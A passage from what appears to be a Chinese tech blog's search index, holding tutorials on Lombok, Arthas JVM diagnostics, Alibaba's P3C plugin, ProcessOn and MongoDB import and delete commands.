      </categories>
      
      
        <tags>
            
            <tag> 效率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>推荐一款代码神器，代码量至少省一半！</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/%E6%8E%A8%E8%8D%90%E4%B8%80%E6%AC%BE%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8%EF%BC%8C%E4%BB%A3%E7%A0%81%E9%87%8F%E8%87%B3%E5%B0%91%E7%9C%81%E4%B8%80%E5%8D%8A%EF%BC%81/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/%E6%8E%A8%E8%8D%90%E4%B8%80%E6%AC%BE%E4%BB%A3%E7%A0%81%E7%A5%9E%E5%99%A8%EF%BC%8C%E4%BB%A3%E7%A0%81%E9%87%8F%E8%87%B3%E5%B0%91%E7%9C%81%E4%B8%80%E5%8D%8A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>在我们 Java 项目里面，有很多 Java Bean 需要为每个属性生成 get&#x2F; set 方法，增删改属性都需要维护这些 get&#x2F; set 方法甚是麻烦。</p><p>今天给大家介绍一款能帮助我们简化这些代码的神器：Lombok！有了这个神器，你的 Java Bean 类的代码量至少可以省一半。</p><h2 id="什么是Lombok？"><a href="#什么是Lombok？" class="headerlink" title="什么是Lombok？"></a>什么是Lombok？</h2><blockquote><p><a href="https://www.projectlombok.org/">https://www.projectlombok.org/</a></p></blockquote><p>打开它的官网，这是它的简介。</p><blockquote><p>Project Lombok is a java library that automatically plugs into your editor and build tools, spicing up your java.<br>Never write another getter or equals method again. Early access to future java features such as val, and much more.</p></blockquote><p>翻译过来就是说，Lombok项目是一个 Java 库，它能够自动嵌入到你的 IDE 编辑器和编译工具中。有了它，你再也不用写 getter 或者 equals 方法了，还有 val 特性等。</p><p>总之，有了这个家伙，可以省掉很多代码的编写，大大减少了工作量和维护的难度。</p><h2 id="如何使用Lombok？"><a href="#如何使用Lombok？" class="headerlink" title="如何使用Lombok？"></a>如何使用Lombok？</h2><h4 id="1、安装插件和配置依赖"><a href="#1、安装插件和配置依赖" class="headerlink" title="1、安装插件和配置依赖"></a>1、安装插件和配置依赖</h4><p><img src="http://img.javastack.cn/18-10-24/10743487.jpg"></p><p>如上图所示，Lombok支持所有主流的 IDE 开发工具及编译构建工具。</p><p>在 IDEA 中安装 Lombok 插件，这样在使用 Lombok 的时候就不会编译报错。</p><p><img src="http://img.javastack.cn/18-10-24/34937474.jpg"></p><p>下面是 Maven 的依赖配置，在用 Maven 打包的时候也能自动生成需要的代码。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.projectlombok&lt;&#x2F;groupId&gt;&lt;artifactId&gt;lombok&lt;&#x2F;artifactId&gt;&lt;version&gt;1.18.2&lt;&#x2F;version&gt;&lt;scope&gt;provided&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你使用了 Spring Boot，可以不用带版本号，在 Spring Boot <code>spring-boot-dependencies.pom</code> 这个配置文件里面定义了 Lombok 依赖。</p><p><img src="http://img.javastack.cn/18-10-24/69810445.jpg"></p><p>所以，你只需要继承版本号即可，当然，有必要的话，你也可以自定义版本号。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.projectlombok&lt;&#x2F;groupId&gt;&lt;artifactId&gt;lombok&lt;&#x2F;artifactId&gt;&lt;scope&gt;provided&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、使用注解简化代码"><a href="#2、使用注解简化代码" class="headerlink" title="2、使用注解简化代码"></a>2、使用注解简化代码</h4><p>从 IDEA 中的 Lombok 插件特性可以看到支持的注解。</p><pre class="line-numbers language-none"><code class="language-none">Features@Getter and @Setter@FieldNameConstants@ToString@EqualsAndHashCode@AllArgsConstructor, @RequiredArgsConstructor and @NoArgsConstructor@Log, @Log4j, @Log4j2, @Slf4j, @XSlf4j, @CommonsLog, @JBossLog, @Flogger@Data@Builder@Singular@Delegate@Value@Accessors@Wither@SneakyThrowsfrom Intellij 14.1 @valfrom Intellij 15.0.2 @varfrom Intellij 14.1 @varfrom Intellij 2016.2 @UtilityClassLombok config systemCode inspectionsRefactoring actions (lombok and delombok)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以去 Lombok 对应的包里面看所有支持的注解。</p><p>现在挑几个讲一下它们的用法吧！</p><p><strong>@Getter 和 @Setter</strong></p><pre class="line-numbers language-none"><code class="language-none">@Getter@Setterpublic class User &#123;    private String name;    private int age;    ...    &#x2F;&#x2F; 无需生成 get&#x2F;set 方法&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加 <code>@Getter</code> 和 <code>@Setter</code> 注解用在 Java Bean 类上面，无需生成 get&#x2F; set 方法，会自动生成所有的 get&#x2F; set 方法及一个默认的构造方法。</p><p>也可以用插件来添加相应的注解。</p><p><img src="http://img.javastack.cn/18-10-24/24119702.jpg"></p><p>来看下源码和生成后的代码对比。</p><p><img src="http://img.javastack.cn/18-10-24/62516669.jpg"></p><p><code>@Getter</code> 和 <code>@Setter</code> 注解也可以单独使用在字段上面，同样也会生成对应的 get&#x2F; set 方法及一个默认的构造方法。</p><p><strong>@ToString</strong></p><p>使用在类上，默认生成所有非静态字段以下面的格式输出，如：</p><pre class="line-numbers language-none"><code class="language-none">public String toString()&#123;    return &quot;Person(userName&#x3D;&quot; + getUserName() + &quot;, id&#x3D;&quot; + getId() + &quot;, age&#x3D;&quot; + getAge() + &quot;, address&#x3D;&quot; + getAddress() + &quot;, memo&#x3D;&quot; + getMemo() + &quot;)&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>里面也有很多参数，用来自定义输出格式。</p><p><strong>@NoArgsConstructor</strong></p><p>用在类上，用来生成一个默认的无参构造方法。</p><p><strong>@RequiredArgsConstructor</strong></p><p>用在类上，使用类中所有带有 <code>@NonNull</code> 注解和 <code>final</code> 类型的字段生成对应的构造方法。 </p><p><strong>@AllArgsConstructor</strong></p><p>用在类上，生成一个所有参数的构造方法，默认不提供无参构造方法。 </p><p><strong>@Data</strong></p><p>用在类上，等同于下面这几个注解合集。</p><ul><li>@Getter</li><li>@Setter</li><li>@RequiredArgsConstructor</li><li>@ToString</li><li>@EqualsAndHashCode</li></ul><p><strong>@Value</strong></p><p>用在类上，等同于下面这几个注解合集。</p><ul><li>@Getter</li><li>@FieldDefaults(makeFinal&#x3D;true, level&#x3D;AccessLevel.PRIVATE)</li><li>@AllArgsConstructor</li><li>@ToString @EqualsAndHashCode}</li></ul><p><strong>@NonNull</strong></p><p>用在属性上，用于字段的非空检查，如果传入到 set 方法中的值为空，则抛出空指针异常，该注解也会生成一个默认的构造方法。 </p><p>还有很多，这里不再撰述。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了 Lombok 及使用说明，更多的注解使用方式可以去源码里面看吧，有了这个插件，可以帮助你写出更简洁、更优雅、更漂亮的 Java 代码。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 效率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>推荐一个在线创作流程图、思维导图软件</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E5%9C%A8%E7%BA%BF%E5%88%9B%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%9B%BE%E3%80%81%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E8%BD%AF%E4%BB%B6/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E5%9C%A8%E7%BA%BF%E5%88%9B%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%9B%BE%E3%80%81%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E8%BD%AF%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>最近要画流程图，破解了半天Visio2016没搞定，2016的估计都被封了，Visio收费又过贵，又不想折腾低版本的破解，所以找了个在线画图平台ProcessOn，没想到还出乎人意料，完全可以达到预期效果，而且比较轻量级，虽然没有提供客户端，但个人觉得已经很棒了。</p><p>这个平台前几年就已经在用，后来没画图又忘了而已，没想到还活着，现在推荐给大家。</p><blockquote><p><a href="https://www.processon.com/i/536766930cf231b22b4a7e38">ProcessOn - 免费在线作图，实时协作</a></p></blockquote><h4 id="ProcessOn是什么"><a href="#ProcessOn是什么" class="headerlink" title="ProcessOn是什么"></a>ProcessOn是什么</h4><p>ProcessOn是一个面向垂直专业领域的作图工具和社交网络，成立于2011年6月并于2012年启动。ProcessOn将全球的专家顾问、咨询机构、BPM厂商、IT解决方案厂商和广泛的企业用户紧密的连接在一起，提供基于云服务的免费流程梳理、创作协作工具，与同事和客户协同设计，实时创建和编辑文件，并可以实现更改的及时合并与同步，这意味着跨部门的流程梳理、优化和确认可以即刻完成。</p><p>专注于为作图人员提供价值，利用互联网和社交技术颠覆了人们梳理流程的方法习惯，继而使商业用户获得比传统模式更高的效率和回报，改善人们对流程图的创作过程。</p><h4 id="主要特色"><a href="#主要特色" class="headerlink" title="主要特色"></a>主要特色</h4><p><strong>1、免费在线作图，实时协作</strong></p><p>ProcessOn 支持流程图、思维导图、原型图、UML、网络拓扑图等。</p><p><img src="https://www.processon.com/assets/images/tour/flow4.png" alt="image"></p><p><strong>2、高效易用、轻松绘制</strong></p><p>ProcessOn是一个在线作图工具的聚合平台，它可以在线画流程图、思维导图、UI原型图、UML、网络拓扑图、组织结构图等等，您无需担心下载和更新的问题，不管Mac还是Windows，一个浏览器就可以随时随地的发挥创意，规划工作。</p><p><img src="https://www.processon.com/assets/images/tour/mind3.png" alt="image"></p><p><strong>3、团队协作、头脑风暴</strong></p><p>您可以把作品分享给团队成员或好友，无论何时何地大家都可以对作品进行编辑、阅读和评论。</p><p><img src="https://www.processon.com/assets/images/tour/team_.png" alt="image"></p><p><strong>4、海量图库，知识分享</strong></p><p>ProcessOn不仅仅汇聚着强大的作图工具，这里还有着海量的图形化知识资源。我们尽可能的将有价值的知识进行梳理，传递到您的眼前。</p><p><img src="https://www.processon.com/assets/images/tour/popular.png" alt="image"></p><p>下面来看看我画的思维导图，功能虽然没有像xmind那样强大，但个人觉得已经完全够用了，主要是模板和主题比xmind要酷很多！</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 效率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>推荐一款阿里开源的 Java 诊断工具，好用到爆！</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/%E6%8E%A8%E8%8D%90%E4%B8%80%E6%AC%BE%E9%98%BF%E9%87%8C%E5%BC%80%E6%BA%90%E7%9A%84%20Java%20%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%A5%BD%E7%94%A8%E5%88%B0%E7%88%86%EF%BC%81/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/%E6%8E%A8%E8%8D%90%E4%B8%80%E6%AC%BE%E9%98%BF%E9%87%8C%E5%BC%80%E6%BA%90%E7%9A%84%20Java%20%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%A5%BD%E7%94%A8%E5%88%B0%E7%88%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Arthas是什么鬼？"><a href="#Arthas是什么鬼？" class="headerlink" title="Arthas是什么鬼？"></a>Arthas是什么鬼？</h2><p>Arthas是一款阿里巴巴开源的 Java 线上诊断工具，功能非常强大，可以解决很多线上不方便解决的问题。</p><p>Arthas诊断使用的是命令行交互模式，支持JDK6+，Linux、Mac、Windows 操作系统，命令还支持使用 <code>tab</code> 键对各种信息的自动补全，诊断起来非常利索。</p><p>这是它的官方网站：</p><blockquote><p><a href="https://alibaba.github.io/arthas/index.html">https://alibaba.github.io/arthas/index.html</a></p></blockquote><p>Github地址：</p><blockquote><p><a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></p></blockquote><h2 id="Arthas能解决什么问题？"><a href="#Arthas能解决什么问题？" class="headerlink" title="Arthas能解决什么问题？"></a>Arthas能解决什么问题？</h2><p>让我们来看下 <code>Arthas</code> 的官方解释。</p><p>当你遇到以下类似问题而束手无策时，Arthas可以帮助你解决：</p><p>1、这个类从哪个 jar 包加载的？为什么会报各种类相关的 Exception？</p><p>2、我改的代码为什么没有执行到？难道是我没 commit？分支搞错了？</p><p>3、遇到问题无法在线上 debug，难道只能通过加日志再重新发布吗？</p><p>4、线上遇到某个用户的数据处理有问题，但线上同样无法 debug，线下无法重现！</p><p>5、是否有一个全局视角来查看系统的运行状况？</p><p>6、有什么办法可以监控到JVM的实时运行状态？</p><p><strong>看完是不是觉得太牛逼了？</strong></p><p>特别是它可以在线反编译类，可以不用加日志在线调试跟踪问题代码。</p><p>既然这么牛逼，肯定有不少公司在使用吧，下面列出了官方给出的使用登录顺序图。</p><p><img src="http://img.javastack.cn/20190730173335.png"></p><h2 id="快速安装"><a href="#快速安装" class="headerlink" title="快速安装"></a>快速安装</h2><p>官方推荐使用 <code>arthas-boot</code> 进行安装，非常方便，以下是基于 Linux 系统环境进行演示，一般解决线上问题也是基于 Linux 环境。</p><h4 id="第一步：下载"><a href="#第一步：下载" class="headerlink" title="第一步：下载"></a>第一步：下载</h4><p>在任何目录下载 <code>arthas-boot</code> 这个包。</p><blockquote><p>wget <a href="https://alibaba.github.io/arthas/arthas-boot.jar">https://alibaba.github.io/arthas/arthas-boot.jar</a></p></blockquote><pre class="line-numbers language-none"><code class="language-none">[root@VM_0_7_centos ~]# wget https:&#x2F;&#x2F;alibaba.github.io&#x2F;arthas&#x2F;arthas-boot.jar--2019-07-30 14:48:31--  https:&#x2F;&#x2F;alibaba.github.io&#x2F;arthas&#x2F;arthas-boot.jarResolving alibaba.github.io (alibaba.github.io)... 185.199.108.153, 185.199.109.153, 185.199.110.153, ...Connecting to alibaba.github.io (alibaba.github.io)|185.199.108.153|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 98637 (96K) [application&#x2F;java-archive]Saving to: ‘arthas-boot.jar’100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;] 98,637      32.8KB&#x2F;s   in 2.9s   2019-07-30 14:48:36 (32.8 KB&#x2F;s) - ‘arthas-boot.jar’ saved [98637&#x2F;98637]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="第二步：运行"><a href="#第二步：运行" class="headerlink" title="第二步：运行"></a>第二步：运行</h4><p>使用 <code>java -jar</code> 命令执行 <code>arthas-boot</code> 包。</p><blockquote><p>java -jar arthas-boot.jar</p></blockquote><pre class="line-numbers language-none"><code class="language-none">[INFO] arthas-boot version: 3.1.1[INFO] Found existing java process, please choose one and hit RETURN.* [1]: 13062 spring-boot-best-practice-0.0.1-SNAPSHOT.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="第三步：选择进程"><a href="#第三步：选择进程" class="headerlink" title="第三步：选择进程"></a>第三步：选择进程</h4><p>运行 <code>arthas-boot</code> 后，控制台会显示所有 Java 进程，选择一个你需要诊断的进程。</p><p>如第二步所示，这里有只有一个 Java 进程，输入序号1，回车，Arthas会附到目标进程上，并输出日志：</p><pre class="line-numbers language-none"><code class="language-none">[INFO] Start download arthas from remote server: https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;public&#x2F;com&#x2F;taobao&#x2F;arthas&#x2F;arthas-packaging&#x2F;3.1.1&#x2F;arthas-packaging-3.1.1-bin.zip[INFO] Download arthas success.[INFO] arthas home: &#x2F;root&#x2F;.arthas&#x2F;lib&#x2F;3.1.1&#x2F;arthas[INFO] Try to attach process 13062[INFO] Attach process 13062 success.[INFO] arthas-client connect 127.0.0.1 3658  ,---.  ,------. ,--------.,--.  ,--.  ,---.   ,---.                            &#x2F;  O  \ |  .--. &#39;&#39;--.  .--&#39;|  &#39;--&#39;  | &#x2F;  O  \ &#39;   .-&#39;                          |  .-.  ||  &#39;--&#39;.&#39;   |  |   |  .--.  ||  .-.  |&#96;.  &#96;-.                          |  | |  ||  |\  \    |  |   |  |  |  ||  | |  |.-&#39;    |                         &#96;--&#39; &#96;--&#39;&#96;--&#39; &#39;--&#39;   &#96;--&#39;   &#96;--&#39;  &#96;--&#39;&#96;--&#39; &#96;--&#39;&#96;-----&#39;                                                                                                          wiki      https:&#x2F;&#x2F;alibaba.github.io&#x2F;arthas                                      tutorials https:&#x2F;&#x2F;alibaba.github.io&#x2F;arthas&#x2F;arthas-tutorials                     version   3.1.1                                                                 pid       13062                                                                 time      2019-07-30 14:49:34<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至此，安装、启动完成。</p><p>更多其他安装方式见：<a href="https://alibaba.github.io/arthas/install-detail.html">https://alibaba.github.io/arthas/install-detail.html</a></p><h2 id="实战使用"><a href="#实战使用" class="headerlink" title="实战使用"></a>实战使用</h2><p>启动完成后，当前光标会进入 <code>arthas</code> 的控制台，接受各种操作命令。</p><p>下面，栈长会做几个常用命令的演示，让大家对它有一个基本的认识和快速上手的能力。</p><h4 id="1、dashboard"><a href="#1、dashboard" class="headerlink" title="1、dashboard"></a>1、dashboard</h4><p>显示当前系统的实时数据面板，按 ctrl+c 即可退出。</p><blockquote><p>$ dashboard</p></blockquote><p><img src="http://img.javastack.cn/20190730154952.png"></p><h4 id="2、thread"><a href="#2、thread" class="headerlink" title="2、thread"></a>2、thread</h4><p>查看当前 JVM 的线程堆栈信息。</p><p>thread id， 显示指定线程的运行堆栈：</p><blockquote><p>$ thread 20</p></blockquote><p><img src="http://img.javastack.cn/20190730163759.png"></p><p>显示当前最忙的前N个线程并打印堆栈：</p><blockquote><p>$ thread -n 3</p></blockquote><p><img src="http://img.javastack.cn/20190730163734.png"></p><h4 id="3、sc"><a href="#3、sc" class="headerlink" title="3、sc"></a>3、sc</h4><p>查看 JVM 已加载的类详细信息。</p><blockquote><p>$ sc -d *Test</p></blockquote><p><img src="http://img.javastack.cn/20190730155704.png"></p><h4 id="4、sm"><a href="#4、sm" class="headerlink" title="4、sm"></a>4、sm</h4><p>查看已加载类的方法信息。</p><blockquote><p>$ sm -d cn.javastack.springbootbestpractice.SpringBootBestPracticeApplication main</p></blockquote><p><img src="http://img.javastack.cn/20190730160555.png"></p><h4 id="5、jad"><a href="#5、jad" class="headerlink" title="5、jad"></a>5、jad</h4><p>反编译指定已加载类的源代码。</p><blockquote><p>$ jad cn.javastack.springbootbestpractice.SpringBootBestPracticeApplication</p></blockquote><p><img src="http://img.javastack.cn/20190730155942.png"></p><h4 id="6、trace"><a href="#6、trace" class="headerlink" title="6、trace"></a>6、trace</h4><p>显示方法内部调用路径，非实时返回的命令并输出方法路径上的总耗时，以及的每个节点上的详细耗时。</p><blockquote><p>$ trace -j cn.javastack.springbootbestpractice.web.JsonTest getUserInfo</p></blockquote><p><img src="http://img.javastack.cn/20190730165157.png"></p><p>-j：表示跳过 JDK 中的方法路径。</p><h4 id="7、monitor"><a href="#7、monitor" class="headerlink" title="7、monitor"></a>7、monitor</h4><p>对某个方法的调用进行定时监控。</p><blockquote><p>$ monitor cn.javastack.springbootbestpractice.web.JsonTest getUserInfo -c 5</p></blockquote><p><img src="http://img.javastack.cn/20190730170442.png"></p><p>-c 5：表示每5秒统计一次，统计周期，默认值为120秒。</p><p><strong>监控维度说明：</strong></p><table><thead><tr><th>监控项</th><th>说明</th></tr></thead><tbody><tr><td>timestamp</td><td>时间戳</td></tr><tr><td>class</td><td>类名</td></tr><tr><td>method</td><td>方法名</td></tr><tr><td>total</td><td>调用次数</td></tr><tr><td>success</td><td>成功次数</td></tr><tr><td>fail</td><td>失败次数</td></tr><tr><td>rt</td><td>平均响应时间</td></tr><tr><td>fail-rate</td><td>失败率</td></tr></tbody></table><h4 id="8、watch"><a href="#8、watch" class="headerlink" title="8、watch"></a>8、watch</h4><p>观测方法执行数据，能方便的观察到指定方法的调用情况，如：返回值、抛出异常、入参等。</p><blockquote><p>$ watch cn.javastack.springbootbestpractice.web.JsonTest getUserInfo ‘{params, returnObj}’ -x 2 -b</p></blockquote><p><img src="http://img.javastack.cn/20190730171659.png"></p><p>以上监控的是一个方法的入参情况，在方法执行前监控：-b，遍历深度：-x 2。</p><h4 id="9、quit-exit"><a href="#9、quit-exit" class="headerlink" title="9、quit&#x2F;exit"></a>9、quit&#x2F;exit</h4><p>退出当前 Arthas。</p><p>这个命令仅退出当前连接的客户端，附到目标进程上的 Arthas 会继续运行，端口不会关闭，下次连接时可以直接连接使用。</p><h4 id="10、shutdown"><a href="#10、shutdown" class="headerlink" title="10、shutdown"></a>10、shutdown</h4><p>关闭 Arthas 服务端，退出所有 Arthas 客户端。</p><p>以上演示了 10 个命令的基本使用，各种命令的使用详情可以在命令带 <code>--help</code> 进行查阅。</p><p><img src="http://img.javastack.cn/20190730172757.png"></p><p>更多其他命令请参考：</p><blockquote><p><a href="https://alibaba.github.io/arthas/commands.html">https://alibaba.github.io/arthas/commands.html</a></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结下来，使用 Arthas 可以很方便的诊断一个 Java 应用程序，如：系统数据面板、JVM实时运行状态、类加载情况、监控方法执行情况、显示方法执行路径等。</p><p>Arthas这些实用的功能确实可以帮助我们解决一些常见的线上问题，也能独立于应用程序代码，但仅局限于在一个 JVM 进程内，如果是分布式系统，Arthas就有点难了。</p><p>好了，今天的文章就到这了，你们也在用 Arthas 吗？欢迎留言分享使用心得，如果觉得文章不错，也可以分享给你的同学、同事们。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 效率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神器，阿里巴巴 Java 代码检查插件</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/%E7%A5%9E%E5%99%A8%EF%BC%8C%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%20Java%20%E4%BB%A3%E7%A0%81%E6%A3%80%E6%9F%A5%E6%8F%92%E4%BB%B6/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/%E7%A5%9E%E5%99%A8%EF%BC%8C%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%20Java%20%E4%BB%A3%E7%A0%81%E6%A3%80%E6%9F%A5%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前阵子阿里巴巴发布了&lt;&lt;阿里巴巴Java开发手册(终极版)&gt;&gt;，可以加QQ群（公众号主菜单，点击微信群）获取。</p><p>不久，又一气呵成发布了Eclipse&#x2F;Intellij Idea下的代码检测插件<code>PC3</code>，可谓是国内代码优秀的检测插件。此插件检测的标准是根据&lt;&lt;阿里巴巴Java开发手册(终极版)&gt;&gt;上面制定的规定进行检测的。</p><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><blockquote><p>代码检测插件放到了github上：<br><a href="https://github.com/alibaba/p3c">https://github.com/alibaba/p3c</a></p></blockquote><p>打开这个网站，在上面可以找到Eclipse&#x2F;Intellij Idea对应的插件，上面有安装的方法，和其他的插件安装方法一样，所以这里不再重复，其使用也相当简单。</p><p>如在Idea下，随便右击一个项目，选择：编码规约扫描，再会对该项目进行扫描并在下面显示该项目不符合规约的所有列表。</p><p>当然，也可以在Tools菜单中进行选择扫描，还有可以切换英文，默认是中文的。另外，默认是打开实时检测的，个人认为没有必要实时检测，这样会增加工具的笨重，开发完提交代码时进行一次扫描还是比较合适的，所以建议关闭实时检测功能。</p><p>体验了一下，感觉这个插件检测的要点还是挺重要的，符合国人开发规范及思维，推荐配合findbugs同时使用。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 效率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 从Oracle导入数据</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E4%BB%8EOracle%E5%AF%BC%E5%85%A5%E6%95%B0%E6%8D%AE/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E4%BB%8EOracle%E5%AF%BC%E5%85%A5%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h2><p>从Oracle中把表中的数据导出为csv格式。</p><h2 id="数据导入"><a href="#数据导入" class="headerlink" title="数据导入"></a>数据导入</h2><p>使用MongoDB自带的工具：mongoimport。</p><pre class="line-numbers language-none"><code class="language-none">mongoimport -h localhost -d dev -c t_data --type csv --file d:\t_data.csv --headerline --upsert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><p><code>-h</code>：指定连接主机<br><code>-d</code>：指定数据库<br><code>-c</code>：指定集合<br><code>--type</code>：指定导入文件类型<br><code>--file</code>：指定导入文件<br><code>--headerline</code>：第一行作为字段名，CSV&#x2F;TSV可用。<br><code>--upsert</code>：如果数据存在就使用替换模式。</p><p>更多输入<code>mongoimport --help</code>查看</p><p>或者查看官方定义：</p><blockquote><p><a href="https://docs.mongodb.com/manual/reference/program/mongoimport/">https://docs.mongodb.com/manual/reference/program/mongoimport/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 删除数据用法</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><pre class="line-numbers language-none"><code class="language-none">db.collection.deleteOne() 删除单条数据，3.2开始支持。db.collection.deleteMany() 删除多条数据，3.2开始支持。db.collection.remove()    删除单条或者多条数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="示例集合"><a href="#示例集合" class="headerlink" title="示例集合"></a>示例集合</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.insertMany( [   &#123; item: &quot;journal&quot;, qty: 25, size: &#123; h: 14, w: 21, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;,   &#123; item: &quot;notebook&quot;, qty: 50, size: &#123; h: 8.5, w: 11, uom: &quot;in&quot; &#125;, status: &quot;P&quot; &#125;,   &#123; item: &quot;paper&quot;, qty: 100, size: &#123; h: 8.5, w: 11, uom: &quot;in&quot; &#125;, status: &quot;D&quot; &#125;,   &#123; item: &quot;planner&quot;, qty: 75, size: &#123; h: 22.85, w: 30, uom: &quot;cm&quot; 